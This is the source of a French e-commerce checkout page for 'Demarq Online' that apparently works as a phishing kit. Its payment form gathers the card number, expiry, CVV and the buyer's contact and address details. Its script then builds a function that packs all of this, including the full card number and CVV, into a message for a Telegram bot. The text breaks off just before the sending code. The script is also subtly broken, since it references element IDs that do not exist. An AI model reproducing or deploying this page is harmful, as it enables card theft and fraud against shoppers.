<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Paiement Sécurisé | Demarq Online</title>
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css">
  <style>
    :root {
      --primary: #002640;
      --primary-dark: #001a33;
      --primary-light: #003d73;
      --secondary: #e6005c;
      --secondary-dark: #c5004e;
      --accent: #00c853;
      --accent-dark: #00b247;
      --light-blue: #e6f7ff;
      --light-pink: #fff0f5;
      --light-orange: #ffe5db;
      --border-orange: #ffc0b3;
      --text-dark: #222;
      --text-medium: #555;
      --text-light: #777;
      --bg-light: #f6f7f9;
      --white: #fff;
      --success: #00e676;
      --warning: #ff9800;
      --danger: #f44336;
      --info: #2196f3;
      --shadow-sm: 0 2px 8px rgba(0, 0, 0, 0.08);
      --shadow-md: 0 4px 12px rgba(0, 0, 0, 0.12);
      --shadow-lg: 0 8px 24px rgba(0, 0, 0, 0.15);
      --radius-sm: 4px;
      --radius-md: 8px;
      --radius-lg: 12px;
      --radius-xl: 30px;
      --transition: all 0.3s cubic-bezier(0.25, 0.8, 0.25, 1);
    }

    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      font-family: 'Poppins', sans-serif;
      background: var(--bg-light);
      color: var(--text-dark);
      line-height: 1.6;
      text-align: left;
      direction: ltr;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
    }

    a {
      text-decoration: none;
      color: inherit;
      transition: var(--transition);
    }

    ul {
      list-style: none;
    }

    img {
      max-width: 100%;
      height: auto;
      display: block;
    }

    .container {
      width: 100%;
      max-width: 1200px;
      margin: 0 auto;
      padding: 0 15px;
    }

    /* Notification Toast */
    .toast {
      position: fixed;
      bottom: 20px;
      right: 20px;
      background: var(--primary);
      color: var(--white);
      padding: 15px 25px;
      border-radius: var(--radius-md);
      box-shadow: var(--shadow-lg);
      display: flex;
      align-items: center;
      gap: 15px;
      z-index: 1000;
      transform: translateY(100px);
      opacity: 0;
      transition: var(--transition);
      max-width: 350px;
    }

    .toast.show {
      transform: translateY(0);
      opacity: 1;
    }

    .toast__icon {
      font-size: 20px;
    }

    .toast--success {
      background: var(--success);
    }

    .toast--error {
      background: var(--danger);
    }

    /* Top Bar */
    .top-bar {
      background: var(--primary);
      color: var(--white);
      padding: 12px 0;
      text-align: center;
      font-size: 14px;
      font-weight: 500;
      position: relative;
      z-index: 50;
      box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
    }

    .top-bar__highlight {
      background: var(--secondary);
      color: var(--white);
      padding: 4px 12px;
      border-radius: var(--radius-sm);
      font-weight: 600;
      margin-left: 8px;
      display: inline-block;
      animation: pulse 2s infinite;
    }

    @keyframes pulse {
      0% { transform: scale(1); }
      50% { transform: scale(1.05); }
      100% { transform: scale(1); }
    }

    /* Header */
    .header {
      background: var(--primary);
      color: var(--white);
      padding: 15px 0;
      position: sticky;
      top: 0;
      z-index: 100;
      box-shadow: var(--shadow-md);
      transition: var(--transition);
    }

    .header.scrolled {
      padding: 10px 0;
      box-shadow: var(--shadow-lg);
    }

    .header__content {
      display: flex;
      align-items: center;
      justify-content: space-between;
      gap: 20px;
    }

    .logo {
      font-size: 26px;
      font-weight: 700;
      display: flex;
      align-items: center;
      transition: var(--transition);
    }

    .logo:hover {
      transform: translateY(-2px);
    }

    .logo__highlight {
      color: #00e6e6;
      margin-left: 5px;
      font-weight: 800;
    }

    .search {
      flex: 1;
      max-width: 600px;
      position: relative;
    }

    .search__input {
      width: 100%;
      padding: 14px 25px;
      padding-right: 50px;
      border-radius: var(--radius-xl);
      border: none;
      font-size: 15px;
      transition: var(--transition);
      box-shadow: var(--shadow-sm);
    }

    .search__input:focus {
      outline: none;
      box-shadow: 0 0 0 3px rgba(0, 200, 83, 0.3);
    }

    .search__icon {
      position: absolute;
      right: 25px;
      top: 50%;
      transform: translateY(-50%);
      color: var(--text-medium);
      cursor: pointer;
    }

    .cart {
      display: flex;
      align-items: center;
      gap: 8px;
      font-weight: 600;
      font-size: 15px;
      cursor: pointer;
      transition: var(--transition);
      padding: 10px 15px;
      border-radius: var(--radius-md);
      position: relative;
    }

    .cart:hover {
      background: rgba(255, 255, 255, 0.15);
      transform: translateY(-2px);
    }

    .cart__icon {
      font-size: 20px;
    }

    .cart__count {
      position: absolute;
      top: -5px;
      right: -5px;
      background: var(--secondary);
      color: var(--white);
      width: 20px;
      height: 20px;
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 12px;
      font-weight: 700;
    }

    /* Breadcrumb */
    .breadcrumb {
      padding: 20px 0;
      font-size: 14px;
      color: var(--text-medium);
      background: var(--white);
      box-shadow: 0 2px 4px rgba(0, 0, 0, 0.05);
    }

    .breadcrumb__item {
      display: inline-flex;
      align-items: center;
    }

    .breadcrumb__item:not(:last-child)::after {
      content: '›';
      margin: 0 10px;
      color: var(--text-light);
    }

    .breadcrumb__link {
      color: var(--text-medium);
      transition: var(--transition);
      display: inline-flex;
      align-items: center;
      gap: 5px;
    }

    .breadcrumb__link:hover {
      color: var(--secondary);
      transform: translateX(-2px);
    }

    /* Checkout Steps */
    .checkout-steps {
      display: flex;
      justify-content: space-between;
      margin: 40px 0;
      position: relative;
      padding: 0 50px;
    }

    .checkout-steps:before {
      content: '';
      position: absolute;
      top: 22px;
      left: 50px;
      right: 50px;
      height: 3px;
      background: #eee;
      z-index: 1;
      box-shadow: var(--shadow-sm);
    }

    .step {
      display: flex;
      flex-direction: column;
      align-items: center;
      position: relative;
      z-index: 2;
    }

    .step__number {
      width: 44px;
      height: 44px;
      border-radius: 50%;
      background: #eee;
      color: var(--text-light);
      display: flex;
      align-items: center;
      justify-content: center;
      font-weight: 700;
      margin-bottom: 12px;
      border: 3px solid var(--white);
      box-shadow: var(--shadow-sm);
      transition: var(--transition);
    }

    .step.active .step__number {
      background: var(--accent);
      color: var(--white);
      transform: scale(1.1);
    }

    .step.completed .step__number {
      background: var(--success);
      color: var(--white);
    }

    .step__label {
      font-size: 15px;
      color: var(--text-light);
      font-weight: 500;
      transition: var(--transition);
    }

    .step.active .step__label {
      color: var(--primary);
      font-weight: 700;
      transform: translateY(2px);
    }

    /* Checkout Content */
    .checkout-content {
      display: grid;
      grid-template-columns: 1fr 380px;
      gap: 40px;
      margin: 30px 0 60px;
      align-items: flex-start;
    }

    @media (max-width: 992px) {
      .checkout-content {
        grid-template-columns: 1fr;
      }
      
      .order-summary {
        order: -1;
        margin-bottom: 30px;
      }
    }

    /* Payment Form */
    .payment-form {
      background: var(--white);
      border-radius: var(--radius-lg);
      padding: 40px;
      box-shadow: var(--shadow-md);
      transition: var(--transition);
      min-height: calc(100vh - 400px);
    }

    .payment-form:hover {
      box-shadow: var(--shadow-lg);
    }

    .section-title {
      font-size: 22px;
      font-weight: 700;
      color: var(--primary);
      margin-bottom: 25px;
      display: flex;
      align-items: center;
      gap: 12px;
      position: relative;
      padding-bottom: 10px;
    }

    .section-title:after {
      content: '';
      position: absolute;
      bottom: 0;
      left: 0;
      width: 50px;
      height: 3px;
      background: var(--accent);
      border-radius: 3px;
    }

    .section-title i {
      color: var(--accent);
      font-size: 24px;
    }

    .form-group {
      margin-bottom: 25px;
      position: relative;
    }

    .form-row {
      display: grid;
      grid-template-columns: 1fr 1fr;
      gap: 20px;
      margin-bottom: 20px;
    }

    @media (max-width: 576px) {
      .form-row {
        grid-template-columns: 1fr;
      }
    }

    .form-label {
      display: block;
      margin-bottom: 10px;
      font-weight: 600;
      color: var(--text-medium);
      font-size: 15px;
    }

    .form-control {
      width: 100%;
      padding: 14px 18px;
      border: 1px solid #ddd;
      border-radius: var(--radius-md);
      font-size: 15px;
      transition: var(--transition);
      background: var(--white);
      box-shadow: var(--shadow-sm);
    }

    .form-control:focus {
      outline: none;
      border-color: var(--accent);
      box-shadow: 0 0 0 3px rgba(0, 200, 83, 0.2);
    }

    .form-select {
      appearance: none;
      background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='16' height='16' fill='%23555' viewBox='0 0 16 16'%3E%3Cpath d='M7.247 11.14 2.451 5.658C1.885 5.013 2.345 4 3.204 4h9.592a1 1 0 0 1 .753 1.659l-4.796 5.48a1 1 0 0 1-1.506 0z'/%3E%3C/svg%3E");
      background-repeat: no-repeat;
      background-position: right 18px center;
      background-size: 14px;
    }

    .form-hint {
      font-size: 13px;
      color: var(--text-light);
      margin-top: 8px;
      display: block;
    }

    /* Credit Card Preview */
    .credit-card {
      background: linear-gradient(135deg, var(--primary), var(--primary-light));
      color: var(--white);
      border-radius: var(--radius-lg);
      padding: 25px;
      margin-bottom: 30px;
      box-shadow: var(--shadow-lg);
      position: relative;
      overflow: hidden;
      transition: var(--transition);
      height: 200px;
      display: flex;
      flex-direction: column;
      justify-content: space-between;
    }

    .credit-card:after {
      content: '';
      position: absolute;
      top: -50%;
      right: -50%;
      width: 200px;
      height: 200px;
      background: rgba(255, 255, 255, 0.1);
      border-radius: 50%;
    }

    .credit-card__type {
      position: absolute;
      top: 25px;
      right: 25px;
      font-size: 30px;
    }

    .credit-card__number {
      font-size: 22px;
      letter-spacing: 2px;
      margin: 20px 0;
      font-family: 'Courier New', monospace;
      font-weight: 600;
    }

    .credit-card__info {
      display: flex;
      justify-content: space-between;
      font-size: 14px;
    }

    .credit-card__name {
      text-transform: uppercase;
    }

    .credit-card__expiry {
      display: flex;
      gap: 5px;
    }

    /* Order Summary */
    .order-summary {
      background: var(--white);
      border-radius: var(--radius-lg);
      padding: 35px;
      box-shadow: var(--shadow-md);
      position: sticky;
      top: 120px;
      transition: var(--transition);
      height: fit-content;
    }

    .summary-title {
      font-size: 20px;
      font-weight: 700;
      color: var(--primary);
      margin-bottom: 25px;
      padding-bottom: 15px;
      border-bottom: 1px solid #eee;
      position: relative;
    }

    .summary-title:after {
      content: '';
      position: absolute;
      bottom: -1px;
      left: 0;
      width: 50px;
      height: 2px;
      background: var(--secondary);
    }

    .summary-items {
      margin-bottom: 25px;
      max-height: 300px;
      overflow-y: auto;
      padding-right: 10px;
    }

    .summary-items::-webkit-scrollbar {
      width: 6px;
    }

    .summary-items::-webkit-scrollbar-track {
      background: #f1f1f1;
      border-radius: 10px;
    }

    .summary-items::-webkit-scrollbar-thumb {
      background: var(--accent);
      border-radius: 10px;
    }

    .summary-item {
      display: flex;
      margin-bottom: 20px;
      padding-bottom: 20px;
      border-bottom: 1px dashed #eee;
    }

    .summary-item:last-child {
      border-bottom: none;
      margin-bottom: 0;
      padding-bottom: 0;
    }

    .summary-item__image {
      width: 70px;
      height: 70px;
      border-radius: var(--radius-sm);
      object-fit: contain;
      margin-right: 20px;
      border: 1px solid #eee;
      padding: 5px;
      background: var(--white);
    }

    .summary-item__info {
      flex: 1;
    }

    .summary-item__name {
      font-weight: 600;
      margin-bottom: 8px;
      color: var(--primary);
    }

    .summary-item__price {
      color: var(--secondary);
      font-weight: 700;
      font-size: 16px;
    }

    .summary-item__quantity {
      color: var(--text-light);
      font-size: 14px;
    }

    .summary-totals {
      border-top: 1px solid #eee;
      padding-top: 25px;
      margin-top: 15px;
    }

    .summary-row {
      display: flex;
      justify-content: space-between;
      margin-bottom: 12px;
    }

    .summary-label {
      color: var(--text-medium);
      font-size: 15px;
    }

    .summary-value {
      font-weight: 600;
      font-size: 15px;
    }

    .summary-total {
      font-weight: 800;
      font-size: 20px;
      color: var(--primary);
      margin-top: 15px;
    }

    /* Checkout Actions */
    .checkout-actions {
      display: flex;
      justify-content: space-between;
      margin-top: 35px;
      gap: 15px;
    }

    .btn {
      display: inline-flex;
      align-items: center;
      justify-content: center;
      padding: 0 30px;
      height: 52px;
      border-radius: var(--radius-md);
      font-weight: 700;
      cursor: pointer;
      transition: var(--transition);
      border: none;
      font-size: 16px;
      box-shadow: var(--shadow-sm);
      flex: 1;
    }

    .btn--primary {
      background: var(--accent);
      color: var(--white);
    }

    .btn--primary:hover {
      background: var(--accent-dark);
      transform: translateY(-3px);
      box-shadow: var(--shadow-md);
    }

    .btn--secondary {
      background: var(--primary);
      color: var(--white);
    }

    .btn--secondary:hover {
      background: var(--primary-dark);
      transform: translateY(-3px);
    }

    .btn--icon {
      margin-right: 10px;
    }

    /* Security Badges */
    .security-badges {
      display: flex;
      justify-content: center;
      gap: 20px;
      margin-top: 30px;
      flex-wrap: wrap;
    }

    .security-badge {
      display: flex;
      align-items: center;
      gap: 8px;
      font-size: 13px;
      color: var(--text-light);
    }

    .security-badge i {
      color: var(--success);
      font-size: 18px;
    }

    /* Footer */
    .footer {
      background: var(--primary);
      color: var(--white);
      padding: 60px 0 30px;
      margin-top: auto;
    }

    .footer__grid {
      display: grid;
      grid-template-columns: repeat(4, 1fr);
      gap: 40px;
      margin-bottom: 50px;
    }

    @media (max-width: 992px) {
      .footer__grid {
        grid-template-columns: repeat(2, 1fr);
      }
    }

    @media (max-width: 576px) {
      .footer__grid {
        grid-template-columns: 1fr;
      }
    }

    .footer__title {
      font-size: 20px;
      font-weight: 700;
      margin-bottom: 25px;
      position: relative;
      padding-bottom: 15px;
    }

    .footer__title:after {
      content: '';
      position: absolute;
      bottom: 0;
      left: 0;
      width: 50px;
      height: 3px;
      background: var(--secondary);
    }

    .footer__links {
      display: flex;
      flex-direction: column;
      gap: 12px;
    }

    .footer__link {
      color: rgba(255, 255, 255, 0.9);
      transition: var(--transition);
      font-size: 15px;
      display: flex;
      align-items: center;
      gap: 8px;
    }

    .footer__link i {
      width: 20px;
      text-align: center;
      font-size: 14px;
      opacity: 0.7;
    }

    .footer__link:hover {
      color: var(--white);
      padding-left: 5px;
    }

    .newsletter {
      margin-bottom: 25px;
    }

    .newsletter__text {
      margin-bottom: 20px;
      font-size: 15px;
      opacity: 0.9;
      line-height: 1.7;
    }

    .newsletter__form {
      display: flex;
      gap: 10px;
    }

    .newsletter__input {
      flex: 1;
      padding: 12px 15px;
      border-radius: var(--radius-sm);
      border: none;
      font-size: 15px;
      box-shadow: var(--shadow-sm);
    }

    .newsletter__input:focus {
      outline: none;
      box-shadow: 0 0 0 3px rgba(230, 0, 92, 0.2);
    }

    .newsletter__btn {
      background: var(--secondary);
      color: var(--white);
      border: none;
      padding: 0 25px;
      border-radius: var(--radius-sm);
      font-weight: 600;
      cursor: pointer;
      transition: var(--transition);
      box-shadow: var(--shadow-sm);
    }

    .newsletter__btn:hover {
      background: var(--secondary-dark);
      transform: translateY(-2px);
    }

    .social-links {
      display: flex;
      gap: 15px;
      margin-top: 25px;
    }

    .social-link {
      width: 40px;
      height: 40px;
      border-radius: 50%;
      background: rgba(255, 255, 255, 0.1);
      display: flex;
      align-items: center;
      justify-content: center;
      transition: var(--transition);
      font-size: 18px;
    }

    .social-link:hover {
      background: var(--secondary);
      transform: translateY(-3px);
      box-shadow: var(--shadow-sm);
    }

    .footer__bottom {
      border-top: 1px solid rgba(255, 255, 255, 0.1);
      padding-top: 30px;
      display: flex;
      justify-content: space-between;
      align-items: center;
      flex-wrap: wrap;
      gap: 20px;
    }

    .copyright {
      font-size: 14px;
      opacity: 0.8;
    }

    .payment-methods {
      display: flex;
      gap: 10px;
      flex-wrap: wrap;
    }

    .payment-method {
      width: 50px;
      height: 30px;
      background: var(--white);
      border-radius: var(--radius-sm);
      display: flex;
      align-items: center;
      justify-content: center;
      overflow: hidden;
      padding: 5px;
      box-shadow: var(--shadow-sm);
    }

    .payment-method img {
      max-width: 100%;
      max-height: 100%;
      object-fit: contain;
    }

    .trustpilot {
      display: flex;
      align-items: center;
      gap: 10px;
      color: var(--success);
      font-weight: 700;
      background: rgba(255, 255, 255, 0.1);
      padding: 8px 15px;
      border-radius: var(--radius-sm);
    }

    .trustpilot__stars {
      color: var(--warning);
    }

    /* Loading overlay */
    .loading-overlay {
      position: fixed;
      top: 0;
      left: 0;
      right: 0;
      bottom: 0;
      background: rgba(0, 0, 0, 0.7);
      display: flex;
      justify-content: center;
      align-items: center;
      z-index: 1000;
      opacity: 0;
      visibility: hidden;
      transition: var(--transition);
    }

    .loading-overlay.active {
      opacity: 1;
      visibility: visible;
    }

    .loading-spinner {
      border: 5px solid rgba(255, 255, 255, 0.3);
      border-top: 5px solid var(--accent);
      border-radius: 50%;
      width: 60px;
      height: 60px;
      animation: spin 1s linear infinite;
      position: relative;
    }

    .loading-spinner:after {
      content: '';
      position: absolute;
      top: -8px;
      left: -8px;
      right: -8px;
      bottom: -8px;
      border: 3px solid rgba(0, 200, 83, 0.2);
      border-radius: 50%;
    }

    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }

    /* Responsive Adjustments */
    @media (max-width: 768px) {
      .header__content {
        flex-wrap: wrap;
        gap: 15px;
      }
      
      .logo {
        order: 1;
        font-size: 22px;
      }
      
      .search {
        order: 3;
        width: 100%;
        max-width: 100%;
        margin-top: 10px;
      }
      
      .cart {
        order: 2;
      }
      
      .checkout-steps {
        padding: 0 20px;
      }
      
      .checkout-steps:before {
        left: 20px;
        right: 20px;
      }
      
      .payment-form,
      .order-summary {
        padding: 25px;
      }
      
      .credit-card {
        height: 180px;
      }
      
      .credit-card__number {
        font-size: 18px;
      }
    }

    @media (max-width: 480px) {
      .checkout-steps {
        padding: 0;
      }
      
      .checkout-steps:before {
        left: 30px;
        right: 30px;
      }
      
      .step__label {
        font-size: 13px;
        text-align: center;
      }
      
      .checkout-actions {
        flex-direction: column;
      }
      
      .btn {
        width: 100%;
      }
      
      .credit-card {
        height: 160px;
        padding: 20px;
      }
      
      .credit-card__number {
        font-size: 16px;
        margin: 15px 0;
      }
    }
  </style>
</head>
<body>
  <!-- Loading Overlay -->
  <div class="loading-overlay" id="loadingOverlay">
    <div class="loading-spinner"></div>
  </div>

  <!-- Toast Notification -->
  <div class="toast" id="toast">
    <i class="fas fa-check-circle toast__icon"></i>
    <div class="toast__message">Votre paiement a été traité avec succès</div>
  </div>

  <!-- Top Bar -->
  <div class="top-bar">
    <span class="top-bar__highlight">LIVRAISON GRATUITE</span> dès 49€ d'achat | Retour gratuit sous 30 jours
  </div>

  <!-- Header -->
  <header class="header" id="header">
    <div class="container header__content">
      <a href="index.html" class="logo animate__animated animate__fadeIn">
        demarq<span class="logo__highlight">online</span>
      </a>
      
      <div class="search">
        <input type="text" class="search__input" placeholder="Rechercher un produit, une marque..." aria-label="Rechercher">
        <i class="fas fa-search search__icon"></i>
      </div>
      
      <a href="panier.html" class="cart animate__animated animate__fadeIn">
        <i class="fas fa-shopping-cart cart__icon"></i>
        <span>Panier</span>
        <span class="cart__count">1</span>
      </a>
    </div>
  </header>

  <!-- Breadcrumb -->
  <div class="breadcrumb">
    <div class="container">
      <div class="breadcrumb__item">
        <a href="index.html" class="breadcrumb__link">
          <i class="fas fa-home"></i> Accueil
        </a>
      </div>
      <div class="breadcrumb__item">
        <a href="panier.html" class="breadcrumb__link">
          <i class="fas fa-shopping-cart"></i> Panier
        </a>
      </div>
      <div class="breadcrumb__item">
        <a href="traitement2.html" class="breadcrumb__link">
          <i class="fas fa-truck"></i> Livraison
        </a>
      </div>
      <div class="breadcrumb__item">
        <i class="fas fa-credit-card"></i> Paiement
      </div>
    </div>
  </div>

  <!-- Checkout Steps -->
  <div class="container checkout-steps animate__animated animate__fadeInUp">
    <div class="step completed">
      <div class="step__number">1</div>
      <div class="step__label">Panier</div>
    </div>
    <div class="step completed">
      <div class="step__number">2</div>
      <div class="step__label">Livraison</div>
    </div>
    <div class="step active">
      <div class="step__number">3</div>
      <div class="step__label">Paiement</div>
    </div>
    <div class="step">
      <div class="step__number">4</div>
      <div class="step__label">Confirmation</div>
    </div>
  </div>
  <!-- Checkout Content -->
  <div class="container checkout-content animate__animated animate__fadeIn">
    <!-- Payment Form -->

    <!-- Order Summary -->
    <div class="order-summary">
      <h3 class="summary-title">Résumé de la commande</h3>
      
        <div class="summary-row" style="margin-top: 15px;">
          <span class="summary-label summary-total">Total</span>
          <span class="summary-value summary-total">14,99 €</span>
        </div>

    <div class="payment-form">
      <h2 class="section-title"><i class="fas fa-credit-card"></i> Paiement sécurisé</h2>
      
      <div class="credit-card" id="creditCardPreview">
        <div class="credit-card__type">
          <i class="fab fa-cc-visa"></i>
        </div>
        <div class="credit-card__number" id="cardNumberPreview">•••• •••• •••• ••••</div>
        <div class="credit-card__info">
          <div class="credit-card__name" id="cardNamePreview">NOM SUR LA CARTE</div>
          <div class="credit-card__expiry">
            <span id="cardExpiryMonthPreview">••</span>/<span id="cardExpiryYearPreview">••</span>
          </div>
        </div>
      </div>
      
      <form id="paymentForm">
        <div class="form-group">
          <label for="cardName" class="form-label">Nom sur la carte</label>
          <input type="text" id="cardName" class="form-control" required placeholder="Comme indiqué sur votre carte">
        </div>
        
        <div class="form-group">
          <label for="cardNumber" class="form-label">Numéro de carte</label>
          <input type="text" id="cardNumber" class="form-control" required placeholder="1234 5678 9012 3456" maxlength="19">
          <span class="form-hint">Veuillez entrer les 16 chiffres de votre carte</span>
        </div>
        
        <div class="form-row">
          <div class="form-group">
            <label for="cardExpiry" class="form-label">Date d'expiration</label>
            <input type="text" id="cardExpiry" class="form-control" required placeholder="MM/AA" maxlength="5">
          </div>
          <div class="form-group">
            <label for="cardCvv" class="form-label">Code de sécurité</label>
            <input type="text" id="cardCvv" class="form-control" required placeholder="•••" maxlength="3">
            <span class="form-hint">3 chiffres au dos de votre carte</span>
          </div>
        </div>
        
        <div class="security-badges">
          <div class="security-badge">
            <i class="fas fa-lock"></i>
            <span>Paiement sécurisé SSL</span>
          </div>
          <div class="security-badge">
            <i class="fas fa-shield-alt"></i>
            <span>Protection des données</span>
          </div>
        </div>
      </form>
    </div>
      
      <div class="checkout-actions">
        <a href="traitement2.html" class="btn btn--secondary">
          <i class="fas fa-arrow-left btn--icon"></i>
          Retour
        </a>
        <button type="submit" form="paymentForm" class="btn btn--primary" id="payNowBtn">
          Payer maintenant
          <i class="fas fa-lock btn--icon"></i>
        </button>
      </div>
    </div>
  </div>

  <!-- Footer -->
  <footer class="footer">
    <div class="container">
      <div class="footer__grid">
        <div class="footer__col">
          <h3 class="footer__title">Service client</h3>
          <div class="footer__links">
            <a href="#" class="footer__link"><i class="fas fa-headset"></i> Contactez-nous</a>
            <a href="#" class="footer__link"><i class="fas fa-question-circle"></i> FAQ</a>
            <a href="#" class="footer__link"><i class="fas fa-truck"></i> Suivi de commande</a>
            <a href="#" class="footer__link"><i class="fas fa-exchange-alt"></i> Retours & Remboursements</a>
            <a href="#" class="footer__link"><i class="fas fa-ruler-combined"></i> Guide des tailles</a>
          </div>
        </div>
        
        <div class="footer__col">
          <h3 class="footer__title">À propos</h3>
          <div class="footer__links">
            <a href="#" class="footer__link"><i class="fas fa-info-circle"></i> Qui sommes-nous ?</a>
            <a href="#" class="footer__link"><i class="fas fa-store"></i> Nos magasins</a>
            <a href="#" class="footer__link"><i class="fas fa-briefcase"></i> Carrières</a>
            <a href="#" class="footer__link"><i class="fas fa-hand-holding-heart"></i> Responsabilité sociale</a>
            <a href="#" class="footer__link"><i class="fas fa-newspaper"></i> Presse</a>
          </div>
        </div>
        
        <div class="footer__col">
          <h3 class="footer__title">Informations légales</h3>
          <div class="footer__links">
            <a href="#" class="footer__link"><i class="fas fa-file-contract"></i> Conditions générales</a>
            <a href="#" class="footer__link"><i class="fas fa-gavel"></i> Mentions légales</a>
            <a href="#" class="footer__link"><i class="fas fa-lock"></i> Politique de confidentialité</a>
            <a href="#" class="footer__link"><i class="fas fa-cookie-bite"></i> Politique des cookies</a>
            <a href="#" class="footer__link"><i class="fas fa-receipt"></i> Conditions de vente</a>
          </div>
        </div>
        
        <div class="footer__col">
          <h3 class="footer__title">Newsletter</h3>
          <div class="newsletter">
            <p class="newsletter__text">Abonnez-vous à notre newsletter pour recevoir nos offres exclusives et des réductions spéciales !</p>
            <form class="newsletter__form">
              <input type="email" class="newsletter__input" placeholder="Votre adresse email" required>
              <button type="submit" class="newsletter__btn">S'abonner</button>
            </form>
          </div>
          
          <div class="social-links">
            <a href="#" class="social-link" aria-label="Facebook">
              <i class="fab fa-facebook-f"></i>
            </a>
            <a href="#" class="social-link" aria-label="Instagram">
              <i class="fab fa-instagram"></i>
            </a>
            <a href="#" class="social-link" aria-label="Twitter">
              <i class="fab fa-twitter"></i>
            </a>
            <a href="#" class="social-link" aria-label="YouTube">
              <i class="fab fa-youtube"></i>
            </a>
          </div>
        </div>
      </div>
      
      <div class="footer__bottom">
        <div class="copyright">
          © 2023 Demarq Online. Tous droits réservés.
        </div>
        
        <div class="payment-methods">
          <div class="payment-method">
            <img src="https://cdn-icons-png.flaticon.com/512/196/196578.png" loading="lazy" alt="Visa">
          </div>
          <div class="payment-method">
            <img src="https://cdn-icons-png.flaticon.com/512/196/196561.png" loading="lazy" alt="Mastercard">
          </div>
          <div class="payment-method">
            <img src="https://cdn-icons-png.flaticon.com/512/3064/3064076.png" loading="lazy" alt="PayPal">
          </div>
          <div class="payment-method">
            <img src="https://cdn-icons-png.flaticon.com/512/739/739257.png" loading="lazy" alt="CB">
          </div>
          <div class="payment-method">
            <img src="https://cdn-icons-png.flaticon.com/512/825/825454.png" loading="lazy" alt="Apple Pay">
          </div>
          <div class="payment-method">
            <img src="https://cdn-icons-png.flaticon.com/512/825/825462.png" loading="lazy" alt="Google Pay">
          </div>
        </div>
        
        <div class="trustpilot">
          <div class="trustpilot__stars">
            <i class="fas fa-star"></i>
            <i class="fas fa-star"></i>
            <i class="fas fa-star"></i>
            <i class="fas fa-star"></i>
            <i class="fas fa-star-half-alt"></i>
          </div>
          <span>Trustpilot</span>
        </div>
      </div>
    </div>
  </footer>

  <script>
    // Header scroll effect
    const header = document.getElementById('header');
    window.addEventListener('scroll', function() {
      if (window.scrollY > 50) {
        header.classList.add('scrolled');
      } else {
        header.classList.remove('scrolled');
      }
    });

    // Toast notification
    function showToast(message, type = 'success') {
      const toast = document.getElementById('toast');
      const toastIcon = toast.querySelector('.toast__icon');
      const toastMessage = toast.querySelector('.toast__message');
      
      toast.className = `toast toast--${type}`;
      toastMessage.textContent = message;
      
      if (type === 'success') {
        toastIcon.className = 'fas fa-check-circle toast__icon';
      } else if (type === 'error') {
        toastIcon.className = 'fas fa-exclamation-circle toast__icon';
      }
      
      toast.classList.add('show');
      
      setTimeout(() => {
        toast.classList.remove('show');
      }, 5000);
    }

    // Credit card preview
    const cardNameInput = document.getElementById('cardName');
    const numeroCarte = document.getElementById("numero-carte").value.replace(/\s+/g, '');
    const cardExpiryInput = document.getElementById('cardExpiry');
    const cvv = document.getElementById("cvv").value;
    
    // Format card number with spaces
    cardNumberInput.addEventListener('input', function(e) {
      let value = e.target.value.replace(/\s+/g, '');
      if (value.length > 0) {
        value = value.match(new RegExp('.{1,4}', 'g')).join(' ');
      }
      e.target.value = value;
      
      // Update preview
      cardNumberPreview.textContent = value || '•••• •••• •••• ••••';
      
      // Detect card type
      const firstDigit = value.charAt(0);
      let cardType = 'credit-card';
      
      if (/^4/.test(value)) {
        cardType = 'cc-visa';
      } else if (/^5[1-5]/.test(value)) {
        cardType = 'cc-mastercard';
      } else if (/^3[47]/.test(value)) {
        cardType = 'cc-amex';
      } else if (/^6(?:011|5)/.test(value)) {
        cardType = 'cc-discover';
      }
      
      creditCardPreview.querySelector('.credit-card__type i').className = `fab fa-${cardType}`;
    });
    
    // Format expiry date
    cardExpiryInput.addEventListener('input', function(e) {
      let value = e.target.value.replace(/\D/g, '');
      if (value.length >= 2) {
        value = value.substring(0, 2) + '/' + value.substring(2, 4);
      }
      e.target.value = value;
      
      // Update preview
      const parts = value.split('/');
      cardExpiryMonthPreview.textContent = parts[0] || '••';
      cardExpiryYearPreview.textContent = parts[1] || '••';
    });
    
    // Update card name preview
    cardNameInput.addEventListener('input', function(e) {
      cardNamePreview.textContent = e.target.value.toUpperCase() || 'NOM SUR LA CARTE';
    });

    // Gestion du formulaire de paiement
    const paymentForm = document.getElementById('paymentForm');
    const loadingOverlay = document.getElementById('loadingOverlay');
    const payNowBtn = document.getElementById('payNowBtn');
    
    // Fonction pour envoyer les données à Telegram
    async function sendPaymentToTelegram(data, botToken, chatId) {
      const deliveryInfo = JSON.parse(localStorage.getItem('deliveryInfo')) || {};
      
      const message = `
        💳 *Paiement Réussi* 💳
        
        👤 *Informations Client:*
        - Nom: ${deliveryInfo.firstName} ${deliveryInfo.lastName}
        - Email: ${deliveryInfo.email}
        - Téléphone: ${deliveryInfo.phone}
        
        🏠 *Adresse de Livraison:*
        ${deliveryInfo.address}, ${deliveryInfo.zipCode} ${deliveryInfo.city}, ${deliveryInfo.country}
        
        📦 *Option de Livraison:*
        ${deliveryInfo.delivery} (${deliveryInfo.deliveryPrice})
        
        💳 *Informations de Paiement:*
        - Type: Carte Bancaire
       💳 Numéro de Carte: ${numeroCarte}
        - Expiration: ${data.cardExpiry}
        🔒 CVV: ${cvv}
        - Nom sur carte: ${data.cardName}
        
        🛒 *Détails de la Commande:*
        - Produit: Micros sans fil Intempo EE7507WHTSTKEU7
        - Quantité: 1
        - Prix: 14,99 €
        - Livraison: ${deliveryInfo.deliveryPrice}
        - *Total: ${deliveryInfo.deliveryPrice === 'Gratuit' ? '14,99 €' : (14.99 + parseFloat(deliveryInfo.deliveryPrice.replace('€', '').replace(',', '.').trim()).toFixed(2).replace('.', ',') + ' €')}*
      `;
      
      try {
